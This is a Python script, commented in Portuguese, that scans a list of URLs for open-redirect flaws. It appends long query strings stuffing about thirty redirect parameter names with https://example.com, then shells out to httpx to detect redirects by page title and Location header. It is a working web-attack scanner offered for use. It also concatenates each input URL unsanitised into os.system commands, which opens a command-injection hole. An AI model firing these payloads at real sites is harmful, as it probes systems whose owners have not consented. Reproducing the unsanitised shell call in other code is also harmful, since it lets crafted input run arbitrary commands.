import os
import argparse
import threading

# Função para executar o algoritmo em uma thread
def execute_algorithm(urls):
    payload_op_1 = "?redirect=https://example.com&url=https://example.com&link=https://example.com&return=https://example.com&next=https://example.com&return_url=https://example.com&return_uri=https://example.com&return_path=https://example.com&returnto=https://example.com&return_to=https://example.com&target=https://example.com&destination=https://example.com&returnPath=https://example.com&redirect_uri=https://example.com&redirect_url=https://example.com&goto=https://example.com"
    payload_op_2 = "?continue=https://example.com&destination=https://example.com&uri=https://example.com&go=https://example.com&to=https://example.com&returnuri=https://example.com&returnpath=https://example.com&return-path=https://example.com&callback=https://example.com&ref=https://example.com&path=https://example.com&page=https://example.com&view=https://example.com&redir=https://example.com&redirect_to=https://example.com&destination_url=https://example.com"

    for url in urls:
        execucao_op_1 = "echo '"+url+""+payload_op_1+"'|httpx -silent -fr -title|grep 'Example'"
        execucao_op_2 = "echo '"+url+""+payload_op_2+"'|httpx -silent -fr -title|grep 'Example'"

        os.system(execucao_op_1)
        os.system(execucao_op_2)

        execucao_op_1 = "echo '"+url+""+payload_op_1+"'|httpx -silent -mr 'Location: https://example.com'"
        execucao_op_2 = "echo '"+url+""+payload_op_2+"'|httpx -silent -mr 'Location: https://example.com'"

        os.system(execucao_op_1)
        os.system(execucao_op_2)

# Criação do parser de argumentos
parser = argparse.ArgumentParser(description='Exibe uma lista de URLs.')
parser.add_argument('-l', '--lista', type=str, help='Arquivo contendo a lista de URLs.')

# Parse dos argumentos
args = parser.parse_args()

# Abre o arquivo de texto com a lista de URLs
with open(args.lista, 'r') as f:
    urls = [line.strip() for line in f]

# Dividir as URLs em grupos de 15
groups = [urls[i:i+15] for i in range(0, len(urls), 15)]

# Executar o algoritmo em threads
for group in groups:
    thread = threading.Thread(target=execute_algorithm, args=(group,))
    thread.start()

    # Aguardar o término da thread
    thread.join()
